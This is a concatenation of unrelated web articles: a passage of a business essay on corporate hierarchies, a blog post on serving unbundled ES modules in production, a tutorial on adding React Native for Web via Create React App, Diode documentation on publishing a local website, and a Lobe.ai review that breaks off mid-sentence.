While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all. Hear me out.</p><h3>What the Future Might Look Like</h3><p>With everyone and <a href="https://www.itv.com/news/wales/2020-03-19/people-stuck-at-home-are-sharing-pictures-of-their-cat-and-dog-coworkers">their cat</a> — not to mention the <a href="https://www.oecd.org/future-of-work/">OECD</a> — talking about the Future of Work these days, isn’t it time we began trying to tackle company organization with more pizazz? You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<a href="#3po"><sup id="3pr">3</sup></a> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>For the last year, I’ve been running a single-page web app powered by ES modules in production.</p>
<p>It’s a JavaScript app but it doesn’t use Babel, Webpack, Rollup, or any other tooling for transpiling or bundling. The files I write in development are the same files that get served to end-users in production.</p>
<p>The app is for a side-project… an <a href="https://musicboxfun.com/">online music-box song making tool</a>. It’s not a massive app, but it’s not tiny either—there’s currently about 60 JavaScript modules, which are a mix of components, utilities, and third-party libraries. <a href="https://github.com/bryanbraun/music-box-fun/tree/master/site">The codebase</a> looks a lot like a ReactJS project, but it doesn’t use React. It uses a plain JavaScript alternative that substitutes abstractions (like JSX) with native JavaScript features (like template strings). The framework isn’t relevant for the purpose of this post but you can read more about it in <a href="https://www.bryanbraun.com/2019/09/11/web-dev-nirvana-and-why-I-needed-to-let-go-of-reactjs-to-reach-it/">my earlier post</a>, if you are curious.</p>
<p>When I launched the app in August 2019, the industry consensus was that using unbundled ES6 modules in production was a bad idea. Khan Academy tried unbundling their homepage JS and concluded that <a href="https://blog.khanacademy.org/forgo-js-packaging-not-so-fast/">it slowed down their initial page load</a>. That was five years ago and I still don’t know of anybody who seriously considers skipping the bundler and using ES6 modules in production.*</p>
<p>And that’s too bad because now that <a href="https://caniuse.com/es6-module">browser support for ES modules is great</a>, it seems like we could avoid a lot of <a href="https://www.bryanbraun.com/2019/04/16/nonsense/">nonsense</a> by just <a href="https://twitter.com/BryanEBraun/status/1295171120459546624">writing JavaScript that the browser understands</a> (at least for projects where it makes sense).</p>
<p>I kept looking for examples of people doing this but I struggled to find them, so I decided I’d give it a try and see how bad it really was. Here’s what I found:</p>
<h2 id="things-that-met-expectations">Things that met expectations</h2>
<p><strong>Development experience.</strong> I expected the development experience to be great, and it was. There’s no setup instructions, no startup delays. No need to watch files, generate source maps, or wait for things to recompile. Just save the file and refresh. ✨</p>
<p><strong>Deployment.</strong> Deployment was straightforward. All I needed to do was copy my code to the server as-is. My web host Netlify makes it easy to do this on git push (though, to be fair, Netlify can make even the most complex setups easy to deploy).</p>
<p><strong>Dev/Prod parity.</strong> Every time I found a production bug I was able to reproduce it locally. Not a major goal, but very convenient.</p>
<h2 id="things-that-were-worse-than-expected">Things that were worse than expected</h2>
<p><strong>Dependencies not supporting ES modules.</strong>
I often found libraries I wanted to use, only to learn that they didn’t support ES modules. They usually supported CommonJS instead, which meant I couldn’t use them. At first, I was working around this by loading versions of the library that use browser globals (either via script tag, or <a href="https://stackoverflow.com/q/41127479/1154642">side-effects import</a>). This worked, but it didn’t feel ideal.</p>
<p>Eventually, I started using <a href="https://www.snowpack.dev/">Snowpack</a>, which can import dependencies that don’t support ES modules and produce a one-time build that does. This worked so well that <a href="https://github.com/sparkbox/bouncy-ball/pull/104">I’ve started using it on other projects</a>.</p>
<p><strong>Environment variables.</strong> Typically, I’d assign these at build-time but you can’t when there’s no build. Fortunately, Cory House has <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/">a great post describing all the options</a>. I ended up using <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/#option-6-environment-sniffing">environment sniffing</a> which feels a little weird, but ultimately isn’t a big deal for my app.</p>
<p><strong>CSS organization.</strong> I went with traditional CSS using BEM conventions, which was fine. I still wanted to break up my files though, so I used a <code>main.css</code> file with a bunch of <code>@imports</code>. That felt better, but then I had a blocking request that delayed page rendering so <a href="https://github.com/bryanbraun/music-box-fun/commit/dc2cc62c58ae61d972c124a433ca00d9aac304a2">I moved the <code>@imports</code> into an inline style tag</a>. I’m not sure if I like it, so I may keep iterating on this.</p>
<h2 id="things-that-were-better-than-expected">Things that were better than expected</h2>
<p><strong>Cache invalidation.</strong> I was worried that I was going to have trouble invalidating cached CSS or JavaScript (since I couldn’t rely on a bundler to give my assets cache-busting filenames). It turns out that <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETags</a> are a great solution for this (especially since <a href="https://www.netlify.com/blog/2017/02/23/better-living-through-caching/">my web host has a solid implementation that’s quick and simple</a>). I’ve heard that cache-busting filenames can be a bit faster than Etags, but Netlify’s implementation feels pretty snappy to me.</p>
<p><strong>Performance.</strong>
Everything I heard said that ES module performance was going to be terrible, even with HTTP/2. So I braced myself and… it’s been great. I haven’t even done any optimizations beyond making sure that my initial HTML file had some good default markup. I suspect the performance is good because my app isn’t big enough to start hitting any bottlenecks yet (<a href="https://v8.dev/features/modules#performance">this research</a> says you’ll be fine if you’re below a couple hundred modules, which <a href="https://twitter.com/lukejacksonn/status/1318158374878457857">seems to be confirmed anecdotally</a>). This made me realize that that my intuition was off on what was “too big” of an app. You can go a long way before you’re in a place where you need to load 300-500 files, all at once. It feels unlikely that I’ll reach those limits on my app, at least.</p>
<p>I was a little worried about not minifying my JavaScript. Isn’t that a huge number of bytes saved? It turns out that the difference is a lot smaller when your files are served gzipped (or <a href="https://www.netlify.com/blog/2020/05/20/gain-instant-performance-boosts-as-brotli-comes-to-netlify-edge/">brotli-compressed, as in my case</a>). Minifying would still make my files smaller by renaming variables and stripping out comments, but the difference was less than I expected.</p>
<p><strong>Browser support.</strong> Since I wasn’t using Babel, I expected lots of cross-browser issues but they were rare.** It turns out that once you drop IE11 support, browser support of modern JS features is really good. Things like arrow functions, const/let, template strings, ES6 classes, and <code>fetch</code> all have over 95% global support (and that’s including IE11). The only time I didn’t get to use a JS feature I really wanted was <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining">the optional chaining operator</a>, and that feature will probably have 95% support in the next year or two. Evergreen browsers are a powerful thing.</p>
<h2 id="overall-assessment">Overall Assessment</h2>
<p>I’ve been pleasantly surprised. If this were a typical, bundled, single-page-application, I would have needed to deal with one or two major tooling upgrades by now. Instead, I’ve been able to focus on features. <a href="https://blog.jim-nielsen.com/2020/cheating-entropy-with-native-web-tech/">Native web technologies FTW</a>!</p>
<p>If my module count gets so big that performance starts to noticeably degrade, I’m pretty confident that I’ll be able to use Snowpack to work through it. From <a href="https://www.snowpack.dev/#bundle-for-production">their docs</a>:</p>
<blockquote>
<p>Snowpack treats bundling as an optional production optimization, which means you’re free to skip over the extra complexity of bundling until you need it. <strong>You should be able to use a bundler because you want to, and not because you need to</strong>.</p>
</blockquote>
<p>I like this idea of postponing complexity. It feels very agile.</p>
<p>Maybe ES modules aren’t for every project but they’ve worked pretty well for mine. If there are fundamental flaws, I haven’t found them yet.</p>
<p>Honestly, it’s hard for me to imagine building a side-project any other way right now.</p>
<hr>
<p><small>
* I’ve just recently found a few other examples of ES Modules in production including <a href="https://www.runpkg.com/">runpkg.com</a> (<a href="https://github.com/FormidableLabs/runpkg">source</a>) and <a href="https://philipwalton.com/">Phillip Walton’s blog</a> (<a href="https://github.com/philipwalton/blog">source</a>). If anyone knows of others, please let me know <a href="https://www.bryanbraun.com/cdn-cgi/l/email-protection#c7a5a5b5a6b2a9f087a0aaa6aeabe9a4a8aa">via email</a> or the comments.
</small></p>
<p><small>
** More accurately, I <em>have</em> faced some cross-browser issues but they weren’t the kind that Babel could help me with. Babel’s polyfills don’t help when <a href="https://github.com/bryanbraun/intersection-observer-issue">the browser implementation has bugs</a> or <a href="https://github.com/bryanbraun/music-box-fun/issues/7#issuecomment-643037151">your approach is fundamentally flawed</a>. 🙃

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><a href="https://github.com/necolas/react-native-web" target="_blank" rel="nofollow noopener noreferrer">“React Native for Web”</a> makes it possible to run <a href="https://reactnative.dev/" target="_blank" rel="nofollow noopener noreferrer">React Native</a> components and APIs on the web using React DOM — allowing you to target the Android, iOS, and web platforms using a single codebase.</p>
<p>The <a href="http://necolas.github.io/react-native-web/docs/" target="_blank" rel="nofollow noopener noreferrer">React Native for Web documentation</a> has a few examples of <strong>how to get started from scratch</strong>. For example, you can use <code>expo</code> or <code>create-react-native-app</code> to create a new React Native project compatible with React Native for Web. Or you can use <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a> to generate a simple, web-only React app with built-in support of React Native for Web.</p>
<p>In this post, I’d like to take a different approach from the one used in the React Native for Web documentation: I’ll explain how to <strong>add React Native for Web to an existing React Native app using <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a></strong>.</p>
<h2>Setup the Create React App project</h2>
<p>The standard way to setup a React app from scratch using Create React App is by <a href="https://create-react-app.dev/docs/getting-started" target="_blank" rel="nofollow noopener noreferrer">using the <code>create-react-app</code> CLI</a> to generate the entire project. However, in our case, we’re <strong>adding</strong> a React app on top of an existing project, so the setup process will be a bit different.</p>
<h3>Dependencies</h3>
<p>First of all, let’s install these dependencies:</p>
<div data-language="text"><pre><code># If you're using NPM...
npm install react-native-web react-scripts react-dom

# ...or, if you're using Yarn
yarn add react-native-web react-scripts react-dom</code></pre></div>
<ul>
<li><code>react-native-web</code> is the React Native for Web library. It provides a mapping of the React Native components and APIs to their web counterparts.</li>
<li><code>react-scripts</code> are the scripts used by <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a> to bundle and run your web application.</li>
<li><code>react-dom</code> is what allows React to run on the web. It’s recommended to install a version of React DOM that matches your currently installed version of React.</li>
</ul>
<h3>Directory Structure</h3>
<p>Create React App expects your project to follow a <a href="https://create-react-app.dev/docs/folder-structure" target="_blank" rel="nofollow noopener noreferrer">specific directory structure</a>.</p>
<p>Depending on how your current React Native setup looks like, you might need to make some changes to accommodate the Create React App convention.</p>
<p>The next steps will assume you’re starting with a directory structure similar to the following:</p>
<div data-language="bash"><pre><code><span>.</span>
├── android/
│   └── <span>..</span>.
├── ios/
│   └── <span>..</span>.
├── src/
│   ├── App.js 
│   └── <span>..</span>.
└── index.js   </code></pre></div>
<p>For the project to build, <strong>these files must exist with exact filenames</strong>:</p>
<ul>
<li><code>public/index.html</code>: The HTML page template served to the users. Create React App injects your React application in this page.</li>
<li><code>src/index.js</code>: The JavaScript entry-point of your React web application.</li>
</ul>
<p>Normally these files are generated by the <code>create-react-app</code> CLI… but since we couldn’t use it, we need to go a step further and create them manually.</p>
<h3>The Public Directory</h3>
<p>Create a new directory named <code>public</code> at the root of your project. In it, we will put the <code>index.html</code> file and all the additional files that it uses.</p>
<p>To create its content, you can either a) copy and paste in the <code>public</code> directory <a href="https://github.com/facebook/create-react-app/tree/master/packages/cra-template/template/public" target="_blank" rel="nofollow noopener noreferrer">the content of what the <code>create-react-app</code> CLI would have generated</a>, or b) create just a minimal <code>public/index.html</code> file like the following:</p>
<div data-language="html"><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>&gt;</span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>&gt;</span></span>
  <span><span><span>&lt;</span>head</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span> <span>/&gt;</span></span>
    <span><span><span>&lt;</span>meta</span>
      <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span>
      <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1, shrink-to-fit=no<span>"</span></span>
    <span>/&gt;</span></span>
    <span><span><span>&lt;</span>title</span><span>&gt;</span></span>Your App Title<span><span><span>&lt;/</span>title</span><span>&gt;</span></span>
  <span><span><span>&lt;/</span>head</span><span>&gt;</span></span>

  <span><span><span>&lt;</span>body</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>noscript</span><span>&gt;</span></span>You need to enable JavaScript to run this app.<span><span><span>&lt;/</span>noscript</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>root<span>"</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span>
  <span><span><span>&lt;/</span>body</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre></div>
<h3>The JavaScript Entry Point</h3>
<p>Create a new <code>index.js</code> file in your <code>src</code> directory:</p>
<div data-language="js"><pre><code><span>import</span> <span>{</span> AppRegistry <span>}</span> <span>from</span> <span>"react-native"</span><span>;</span>
<span>import</span> <span>{</span> App <span>}</span> <span>from</span> <span>"./App.js"</span><span>;</span>

<span>const</span> appName <span>=</span> <span>"Your app name"</span><span>;</span>

AppRegistry<span>.</span><span>registerComponent</span><span>(</span>appName<span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> App<span>)</span><span>;</span>
AppRegistry<span>.</span><span>runApplication</span><span>(</span>appName<span>,</span> <span>{</span>
  
  rootTag<span>:</span> document<span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>)</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>This is the entry point of the JavaScript code that will be injected in your HTML file.</p>
<p>You might have noticed that you now have two different <code>index.js</code> files — one at the root of your project, and one in the <code>src</code> directory.</p>
<p>The metro bundler — which is the JavaScript bundler that builds your React Native app — will use the <code>index.js</code> file that you already have at the root of your project for building the Android/iOS app.<br>
Webpack — used under the hood by Create React App — will instead use the new <code>src/index.js</code>.</p>
<blockquote>
<p>To be a bit more explicit on which JS index file is used on a specific platform, I’d suggest renaming the root <code>index.js</code> file to <code>index.native.js</code>. See the <a href="https://reactnative.dev/docs/platform-specific-code#platform-specific-extensions" target="_blank" rel="nofollow noopener noreferrer">official React-Native documentation</a> for more details on the platform-specific extensions.</p>
</blockquote>
<h3>Create The Build Scripts</h3>
<p>To complete the Create React App setup, add two script to your <code>package.json</code> to build your web app:</p>
<div data-language="diff"><pre><code><span><span> </span> "scripts": {
</span><span><span>+</span>  "web:start": "react-scripts start",
<span>+</span>  "web:build": "react-scripts build",
</span>}</code></pre></div>
<h2>Running the Web App</h2>
<p>You can now use <code>npm run web:start</code> to spin-up the development environment of your web app and <code>npm run web:build</code> to create a production build.<br>
The default configuration of Create React App already aliases all <code>react-native</code> imports to <code>react-native-web</code> by default, so you won’t have to worry about manually having to swap them based on the target platform.</p>
<p>That said, unless you’re extremely lucky, you won’t be able to run your React Native app on the web on the first try…</p>
<p>Here’s a list of a few common issues you might face.</p>
<h3>Fixing the Dependency Tree Warning</h3>
<p>The first time you run your web app you’ll probably see the following warning in the console:</p>
<div data-language="text"><pre><code>There might be a problem with the project dependency tree.
It is likely not a bug in Create React App, but something you need to fix locally.

The react-scripts package provided by Create React App requires a dependency:

  "babel-jest": "^26.6.0"

Don't try to install it manually: your package manager does it automatically.
However, a different version of babel-jest was detected higher up in the tree:

  /Users/username/workspace/YourProject/node_modules/babel-jest (version: 25.5.1)

Manually installing incompatible versions is known to cause hard-to-debug issues.

If you would prefer to ignore this check, add SKIP_PREFLIGHT_CHECK=true to an .env file in your project.
That will permanently disable this message but you might encounter other issues.</code></pre></div>
<p>This warning shows up because React Native ships with a version of <code>babel-jest</code> (or other packages, depending on what your warning says) that is different from the one used by Create React App.</p>
<p>The warning itself will point you to several possible fixes.<br>
The two options I would suggest you try are:</p>
<ul>
<li>Ignore this check by adding <code>SKIP_PREFLIGHT_CHECK=true</code> to a <code>.env</code> file at the root of your project. This will force <code>react-script</code> to use the dependency versions set in your <code>package.json</code> instead of the ones required by Create React App. Most of the time these errors are caused by a slightly different version of <code>babel-jest</code> or <code>jest</code> that can still be compatible with the versions you were using in your React Native app — which is why this solution will likely work.</li>
<li>Or uninstall the incriminated dependencies and run again <code>npm install</code> or <code>yarn install</code>. This will make your React Native app use the dependencies shipped with Create React App.</li>
</ul>
<p>Regardless of what choice you make here, this change is one of the things you should <strong>test for regressions when in the future you’ll update your project</strong> to a new version of React Native or <code>react-scripts</code>.</p>
<h3>Resolve Native Module Conflicts</h3>
<p>React Native for Web is compatible with <a href="https://github.com/necolas/react-native-web#components" target="_blank" rel="nofollow noopener noreferrer">many native modules that ship with React Native</a>: <code>Button</code>, <code>Views</code>, <code>TextInput</code>, etc… will be automatically mapped to their web counterparts correctly when imported from <code>react-native</code>.<br>
Unfortunately, using other external native libraries like <a href="https://github.com/zmxv/react-native-sound" target="_blank" rel="nofollow noopener noreferrer"><code>react-native-sound</code></a> or <a href="https://github.com/corbt/react-native-keep-awake" target="_blank" rel="nofollow noopener noreferrer"><code>react-native-keep-awake</code></a> can be a bit hit-and-miss because many native functionalities are not available on the web.</p>
<p>In these cases, your web app will fail to compile with errors such as <code>Module not found</code>.</p>
<p>The <a href="https://reactnative.dev/docs/platform-specific-code" target="_blank" rel="nofollow noopener noreferrer">React Native “Platform Specific Code” documentation</a> has some great tips on how you can run platform-specific code and solve these issues.</p>
<p>My suggestion is to <strong>abstract these native libraries in files with <a href="https://reactnative.dev/docs/platform-specific-code#platform-specific-extensions" target="_blank" rel="nofollow noopener noreferrer">platform-specific extensions</a></strong> so that only the React Native bundler will import them.</p>
<p>For example, assuming you want to use the <code>KeepAwake</code> component exported by the <code>react-native-keep-awake</code> only in your React Native app you should create two files:</p>
<ul>
<li>A file with the code that runs <strong>on the native app</strong> named <code>KeepAwake.native.js</code> that just acts as a proxy for the <code>react-native-keep-awake</code> library:</li>
</ul>
<div data-language="js"><pre><code><span>import</span> KeepAwake <span>from</span> <span>"react-native-keep-awake"</span><span>;</span>
<span>export</span> <span>default</span> KeepAwake<span>;</span></code></pre></div>
<ul>
<li>A file with the code that runs <strong>on the web</strong> named <code>KeepAwake.js</code> that exports a mock/empty component:</li>
</ul>
<div data-language="js"><pre><code><span>import</span> <span>{</span> Fragment <span>}</span> <span>from</span> <span>"react"</span><span>;</span>
<span>export</span> <span>default</span> Fragment<span>;</span></code></pre></div>
<p>By following this strategy you can now import the module ignoring the extension (<code>import KeepAwake from "./KeepAwake";</code>). The right file will be picked up automatically by Create React App and by the React Native bundler.</p>
<blockquote>
<p>You might already be familiar with the <code>.android.js</code> and <code>.ios.js</code> extension. This concept basically acts in the same way, differentiating the code that runs on the web from the one that runs your native app by suffixing the latter with the <code>.native.js</code> extension.</p>
</blockquote>
<h3>Customize Create React App</h3>
<p>Eventually, you might need to customize your project beyond what Create React App allows you to do.
Most of these customizations will probably be just slight changes to the Webpack and Babel configuration of Create React App where <a href="https://create-react-app.dev/docs/alternatives-to-ejecting" target="_blank" rel="nofollow noopener noreferrer">ejecting</a> would be overkill — which is why you might wanna use something like <a href="https://github.com/timarney/react-app-rewired/" target="_blank" rel="nofollow noopener noreferrer"><code>react-app-rewired</code></a>, <a href="https://github.com/arackaf/customize-cra" target="_blank" rel="nofollow noopener noreferrer"><code>customize-cra</code></a>, or <a href="https://github.com/gsoft-inc/craco" target="_blank" rel="nofollow noopener noreferrer"><code>craco</code></a> to apply these changes without ejecting.</p>
<p>One of the first few customizations you’ll want to apply to Create React App, is adding support for the <code>__dev__</code> keyword on the web.
The React Native bundler sets the global <code>__dev__</code> variable to <code>true</code> in development mode when you work on your React Native app, while Create React App uses <code>process.env.NODE_ENV</code> to determine if the web app is running in development/production instead.</p>
<p>To have a unified development experience and make your web app aware of <code>__dev__</code>, we can use <code>react-app-rewired</code> + <code>customize-cra</code> to change the Create React App Webpack configuration, setting the <code>__dev__</code> variable correctly.</p></section></div>

                    <p>Diode is the Swiss army knife of Web3 capabilities! One of the neat things it allows you to do is to publish a local website / webserver to the Internet where anyone can view it.</p><p>A common reason for doing this is to allow others to see a website that is under development - the development is done locally and can be viewed by collaborators remotely without setting up a staging server and without any IT tools / configuration. It is much easier and faster to just use Diode to publish your development website so that you can get others' feedback.</p><p>Using this method, you could also host a website long term without requiring a server, static IP address, or ICANN-registered domain name.</p><p>Have fun with this, and let use know in our <a href="https://t.me/diode_chain">Telegram</a> channel if you have any feature requests!</p><h3 id="publish_a_local_website">Publish a Local Website</h3><p>If you already have a website running on port 80 of localhost, <a href="https://support.diode.io/article/lsr4tkzz8t">install Diode</a> and simply run:</p><pre>diode publish <span>-public</span> 80:80</pre><p>This publishes whatever you see at http://localhost:80 to the Diode Network at &lt;client_address&gt;:80. It is accessible on the Internet at https://&lt;client_address&gt;.diode.link.</p><p>The &lt;client_address&gt; can be found in the terminal output, as shown boxed in red below, when the command is ran. The line "Http Gateway Enabled" shows the full external URL - in the case shown below, it is <code>http://0x70114a27f3d1b549012498c69a4120ca4ea11e21.diode.link/</code> You can use that URL to share your website with others.</p><figure><img src="https://files.helpdocs.io/qwk5dmv7m8/articles/ss32engxlq/1599823313774/image.png"></figure><p>If you don't yet have a web server, <a href="https://ghost.org/">Ghost</a> is a good option - see the article about <a href="https://support.diode.io/article/mdelbna1u7">running Ghost on a Raspberry Pi</a>.</p><p>If you are running a service on another port, for example localhost port 2368 (or - Elixir dev server usually uses port 4000, node typically uses port 3000), you can publish it to public port 80 with:</p><pre>diode publish <span>-public</span> 2368:80</pre><h3 id="configure_a_domain_name_with_the_diode_blockchain_name_system_bns">Configure a "Domain Name" with the Diode Blockchain Name System (BNS)</h3><p>In the example above, the URL starts with your globally unique static Client address - a boring sequence of numbers and letters: <code>http://0x70114a27f3d1b549012498c69a4120ca4ea11e21.diode.link/</code>If you want to customize the name, you need to setup a BNS name to map to your address.</p><p>There are two ways to do this:</p><p>1) <a href="https://support.diode.io/article/uec3mloh9z">Configure MetaMask</a> and use the <a href="https://diode.io/prenet/#/dns">Diode Network Explorer</a> (<a href="https://support.diode.io/article/z5h5yx38uj">docs</a>) to reserve a BNS name and link it to your Client address</p><p>2) Use the Diode Client itself to reserve and link:</p><pre>diode bns -register my-example-name</pre><p><span data-hd-color="#fe9200"><strong>IMPORTANT NOTE:</strong> Using the Diode Client to register the BNS name binds the the name to your Client's local wallet. Ensure you keep a backup of your wallet file at ~/.config/diode/private.db so you wonâ€™t lose access to the domain!</span> <span data-hd-color="#000000">If you want one location to manage all your BNS names, use the Diode Network Explorer method (you can use a MetaMask wallet, or hardware wallet, to manage all your BNS names).

Note that you may need to wait a few minutes for the BNS name to be trusted by the network.</p><h3 id="publish_the_website_securely">Publish the Website Securely</h3><p>If you'd only like certain individuals to access your website, you can use the <code>publish</code> option <code>-private</code>to publish it so that only a single specified Diode address can access it, or the option <code>-protected</code> so that only Diode addresses listed in the same <a href="https://support.diode.io/article/7vyr5mslsy">Fleet Contract</a> can access it. For example:</p><pre>diode publish <span>-</span>private 80:80,&lt;authorized_address&gt;</pre><p>Run <code>diode publish --help</code> for more information.</p><p>When using these modes, each viewer must also be <a href="https://support.diode.io/article/sbf1ihdfve">running the Diode Client as a local gateway</a> so as to authenticate themselves with the Diode Network.</p>

October 26, 2020 | http://www.danrose.ai/blog/lobe-ai-review | <a href="https://web.archive.org/web/*/http://www.danrose.ai/blog/lobe-ai-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-cb20ac0fff549259f840"><div><p><a href="https://lobe.ai/"><span>Lobe.ai</span></a> just released for open beta and the short story is that you should go try it out. I was lucky and got to test it in the closed beta so I figured i should review a short review.</p><p>Making AI more understandable and accessible for most people is something I spend a lot of time on and Lobe is without a doubt right down my alley. The tagline is “machine learning made simple” and that is exactly what they do.</p><p>Overall great tool and I see it as an actual advance in the AI technology by making AI and deep learning models even more accessible than the AutoML wave is already doing.</p><h2>So what is Lobe.ai exactly?</h2><p>Lobe.ai is an <a href="https://www.danrose.ai/blog/automl-is-it-useful"><span>Automl tool</span></a>. That means that you can make AI without coding. In Lobe’s case they work with image classification only. So in short you give Lobe a set of images with labels and Lobe will automatically find the most optimal model to classify the images.</p><p>Lobe is also acquired by Microsoft. I think that’s a pretty smart move by Microsoft. The big clouds can be difficult to get started with and especially Microsoft's current <a href="https://www.danrose.ai/blog/automl-solutions-overview"><span>AutoML solutions</span></a> is first of all only tabular data but also requires a good degree of technical skills to get started.</p><p><strong>It’s free.</strong> I don’t really understand the business model yet, but so far the software is free. That is pretty cool but I’m still curious about how the plan on getting revenue to keep up the good work.</p><p><strong>Image classification</strong></p><p>So far Lobe only has one main feature and that’s training and image classification network. And it does that pretty well. In all the tests I have done I have gotten decent results with only very little training data.</p><p><strong>Speed</strong></p><p>The speed is insane. The models are being trained in something that seems like a minut. That’s a really cool feature. You can also decide to train it for longer to get better accuracy.</p><p><strong>Export</strong></p><p>You can export the model to CoreML, TensorFlow, TensorFlow Lite and they also provide a local API.&nbsp;</p><h2>Use Cases</h2><p>I’m planning to use Lobe for both hobby and commercial projects. For commercial use I’m going to use it for the main three purposes:</p><p><strong>Producing models</strong></p><p>Since the quality is good and the export possibilities are ready for production I see no reason not to use this for production purposes when helping clients with AI projects. You might think it’s better to hand build models for commercial use, but my honest experience is that many simple problems should be solved with the simplest solution first. You might stay with a model build with Lobe for at least the first few iterations of a project and sometimes forever.</p><p><strong>Teaching</strong>&nbsp;</p><p>As I’m teaching people about applied AI, Lobe is going to be one of my go to tools from now on. It makes AI development very tangible and accessible and you can play around with it to get a feeling about AI without having to code. When project and product managers get to try developing models themself I expect a lot more understanding of edge cases and unforeseen problems.</p><p><strong>Selling</strong></p><p>When trying to convince a potential customer that they should invest in AI development you easily run into decision makers that have no understanding about AI. By showing Lobe and doing live tests I hope to be able to make the discussion more leveled since there’s a chance we are now talking about the same thing.</p><h2>Compared with other AutoML solutions</h2><p>The bad:</p><p><strong>Less insights&nbsp;</strong></p><p>In short you don’t get any model analysis like you would with <a href="https://kortical.com/"><span>Kortical</span></a> for example.</p><p><strong>Less options</strong></p><p>As mentioned Lobe only offers image classification. Compared to <a href="https://cloud.google.com/automl"><span>Google Automl</span></a>, that does that and objectregocnition, text, tabular, video and so on, it is still limited in use cases.</p><p>The good:</p><p><strong>It’s Easy</strong></p><p>This is the whole core selling point for Lobe and it does it perfectly. Lobe is so easy to use that it could easily be used for teaching 3rd graders.&nbsp;</p><p><strong>It’s Fast</strong></p><p>The model building is so fast that you can barely get a glass of water while training.&nbsp;</p><p>The average:</p><p><strong>Quality</strong></p><p>When I compared a model I build in Google AutoML to one I build in 